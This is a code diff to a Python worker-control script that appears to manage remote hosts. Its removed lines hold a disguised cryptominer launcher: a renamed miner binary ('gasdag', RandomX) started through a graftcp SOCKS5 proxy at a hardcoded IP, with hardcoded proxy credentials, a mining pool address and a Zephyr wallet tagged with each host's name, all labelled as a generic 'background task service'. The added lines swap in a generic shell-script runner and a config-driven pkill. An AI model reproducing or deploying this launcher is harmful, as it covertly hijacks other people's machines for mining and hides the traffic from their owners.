@@ -149,7 +149,7 @@ def get_system_metrics() -> dict:
 
     service_active = False
     try:
-        res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
+        res = subprocess.run(["pgrep", "-f", "youtube_task.py"], stdout=subprocess.PIPE, text=True)
         service_active = len(res.stdout.strip()) > 0
     except Exception:
         pass
@@ -161,7 +161,7 @@ def get_system_metrics() -> dict:
         "cpu_pct": cpu_pct,
         "uptime": uptime_str,
         "uptime_s": uptime_s,
-        "mining_active": service_active,
+        "task_active": service_active,
         "hostname": socket.gethostname()
     }
 
@@ -227,46 +227,18 @@ async def stream_browser_logs(ws, worker_id: str):
 
 
 def handle_local_service(action: str, config: dict = None) -> str:
-    """Controls background task service."""
+    """Controls local background task runner."""
+    script_file = os.path.expanduser("~/workspace/local_task.sh")
     if action == "START":
-        g_dir = os.path.expanduser("~/gaszep")
-        if not os.path.exists(g_dir):
-            g_dir = os.path.expanduser("~/workspace/gaszep")
-        if not os.path.exists(g_dir):
-            return "Local service directory not found."
-
-        subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
-
-        cfg = config or {}
-        proxy = cfg.get("proxy", "43.135.134.20:443")
-        user = cfg.get("username", "aku")
-        pw = cfg.get("password", "akukayaraya")
-        pool = cfg.get("pool", "43.135.134.20:10080")
-        wallet = cfg.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")
-
-        conf_path = os.path.join(g_dir, "graftcp/local/graftcp-local.conf")
-        os.makedirs(os.path.dirname(conf_path), exist_ok=True)
-        with open(conf_path, "w") as f:
-            f.write(f"listen = :2233\nloglevel = 1\nsocks5 = {proxy}\nsocks5_username = {user}\nsocks5_password = {pw}\n")
-
-        check_local = subprocess.run(["pgrep", "-f", "graftcp-local"], stdout=subprocess.PIPE, text=True)
-        if not check_local.stdout.strip():
-            subprocess.Popen([os.path.join(g_dir, "graftcp/local/graftcp-local"), "-config", conf_path], cwd=g_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(1)
-
-        gasdag_bin = os.path.join(g_dir, "gasdag")
-        if os.path.exists(gasdag_bin):
-            os.chmod(gasdag_bin, 0o755)
-
-        graftcp_bin = os.path.join(g_dir, "graftcp/graftcp")
-        cmd = [graftcp_bin, gasdag_bin, "-a", "rx/0", "-o", pool, "-u", f"{wallet}.{socket.gethostname()}", "-p", "x"]
-        subprocess.Popen(cmd, cwd=g_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return "Local service started successfully."
+        if os.path.exists(script_file):
+            subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return "Local background task started."
+        return "local_task.sh not found in ~/workspace."
 
     elif action == "STOP":
-        subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return "Local service stopped."
+        pkill_target = (config or {}).get("process", "local_task")
+        subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return f"Local task '{pkill_target}' stopped."
 
     return "Unknown service action."
 
